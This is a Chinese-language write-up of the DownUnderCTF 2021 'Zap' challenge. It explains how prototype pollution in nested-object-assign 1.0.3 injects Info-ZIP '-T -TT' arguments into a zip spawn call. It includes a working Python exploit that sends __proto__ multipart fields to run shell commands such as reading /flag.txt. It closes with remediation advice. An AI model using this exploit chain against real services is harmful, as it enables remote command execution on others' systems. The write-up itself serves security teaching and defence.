# DownUnderCTF 2021 - Zap

## 题目简述

Node.js 服务接收文件和 ZIP 选项，再用存在原型污染漏洞的 `nested-object-assign` 1.0.3 合并配置。污染 `Object.prototype.extra_opts` 后，固定的 `ZIP_OPTS` 会继承攻击者提供的额外命令行参数；利用 Info-ZIP 的 `-T -TT` 测试命令功能即可执行任意 shell 命令，并把输出覆盖到本应返回的 ZIP 文件中。

## 解题过程

### 找到污染源与利用 gadget

上传路由调用：

```javascript
zip(req.file.path, outfile, { zip: req.body })
```

`zip` 内部用 `nested-object-assign` 深度合并配置。锁定版本 1.0.3 会递归处理特殊的 `__proto__` 属性，从而修改所有普通对象继承的 `Object.prototype`。

随后构造 `zip` 参数时存在现成 gadget：

```javascript
return spawn(ZIP_OPTS.executable, [
  "-j",
  outfile,
  infile,
  "--compression-method",
  opts.zip.compressionMethod,
  ...(ZIP_OPTS.extra_opts ?? []),
]);
```

`ZIP_OPTS` 自身通常没有 `extra_opts`，但污染原型后，属性查找会从原型链取得攻击者数组并展开到命令行。

### 注入 `zip -T -TT`

Multer 会把 multipart 字段名中的方括号解释为嵌套结构。可提交：

```python
def run_command(command):
    response = requests.post(
        BASE_URL + "/zip",
        files={"file": ("input.txt", b"hello world")},
        data={
            "__proto__[extra_opts][0]": "-T",
            "__proto__[extra_opts][1]": "-TT",
            "__proto__[extra_opts][2]": command + " > {} #",
        },
    )

    requests.post(
        BASE_URL + "/zip",
        files={"file": ("reset.txt", b"reset")},
        data={"__proto__[extra_opts]": ""},
    )
    return response.text
```

Info-ZIP 中 `-T` 表示创建后测试归档，`-TT CMD` 指定测试时使用的命令。`zip` 会把 `CMD` 中的 `{}` 替换为临时归档文件名，并通过 shell 执行；末尾的 `#` 注释掉工具可能追加的内容。因此：

```text
cat /flag.txt > {} #
```

会把命令输出覆盖到 `outfile`。Node.js 随后照常把这个文件流式返回，响应体不再是 ZIP，而是命令结果。每次命令后清空污染属性可避免残留选项干扰下一次请求。

先执行 `ls /` 可确认 `/flag.txt`，再执行：

```python
print(run_command("cat /flag.txt"))
```

得到：

```text
DUCTF{th4nk_y0u_4_p4rticipating_1n_our_bet4_t3st}
```

## 方法总结

本题的完整链路是 multipart 嵌套字段、易受攻击的深度合并、`Object.prototype` 污染、继承属性被展开为 ZIP 参数，以及 `-TT` 命令执行 gadget。修复应升级 `nested-object-assign` 至修复版本或移除深度合并，对 `__proto__`、`constructor`、`prototype` 做结构级拒绝，并只从自有属性构造固定允许列表中的 ZIP 选项；不应把用户可控数组直接追加到系统命令参数。
